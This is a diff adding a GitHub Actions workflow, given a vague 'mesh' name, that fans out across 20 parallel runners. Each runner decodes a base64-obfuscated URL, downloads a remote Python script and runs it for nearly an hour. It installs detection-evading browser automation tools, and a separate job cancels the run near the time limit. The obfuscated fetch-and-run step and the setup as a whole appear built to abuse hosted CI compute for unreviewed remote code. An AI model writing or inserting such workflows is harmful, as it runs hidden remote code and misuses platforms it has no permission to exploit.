@@ -1,0 +1,91 @@
+name: Pulse Quantum Mesh Core
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: pulse-mesh-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Core Arbiter: Manages timeout and terminates workflow execution
+  # =================================================================
+  core-arbiter:
+    name: "Core Arbiter"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_WINDOW_SEC: 3540
+    steps:
+      - name: Initialize Watch Window
+        run: |
+          echo "[ARBITER] Monitoring run reference: ${{ github.run_id }}"
+          echo "[ARBITER] Holding execution window for ${MAX_WINDOW_SEC} seconds."
+
+          sleep "${MAX_WINDOW_SEC}"
+
+          echo "[ARBITER] Interval cap reached. Issuing cancellation call..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[ARBITER] Cancel API signal dispatched successfully."
+
+  # =================================================================
+  # Mesh Worker Nodes: Parallel distributed execution
+  # =================================================================
+  mesh-workers:
+    name: "MeshNode-Core-${{ matrix.core_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        core_id: [sdm 1, sdm 2, sdm 3, sdm 4, sdm 5, sdm 6, sdm 7, sdm 8, sdm 9, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720]
+
+    steps:
+      - name: Setup Host Environment
+        run: |
+          echo "[SETUP] Provisioning host for Core-${{ matrix.core_id }}..."
+          sudo apt-get update -qq && sudo apt-get install -y curl python3-pip
+
+      - name: Download Processing Script
+        run: |
+          echo "[PULL] Decoding remote target..."
+          B64_DATA="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          TARGET_URL=$(echo "$B64_DATA" | awk '{print $1}' | base64 --decode)
+          curl -sL "$TARGET_URL" -o mesh_runner.py
+          echo "[PULL] Script downloaded as mesh_runner.py."
+
+      - name: Install Dependencies
+        run: |
+          echo "[INSTALL] Installing Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      - name: Launch Mesh Process
+        run: |
+          echo "[PROCESS] Launching worker script on Core-${{ matrix.core_id }}..."
+
+          python3 mesh_runner.py &
+          PROCESS_PID=$!
+
+          echo "[PROCESS] Background task running (PID: $PROCESS_PID). Waiting 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$PROCESS_PID" 2>/dev/null; then
+            echo "[PROCESS] Max execution time reached — sending SIGKILL."
+            kill -9 "$PROCESS_PID"
+            echo "[PROCESS] Task terminated."
+          else
+            echo "[PROCESS] Task concluded independently."
+          fi
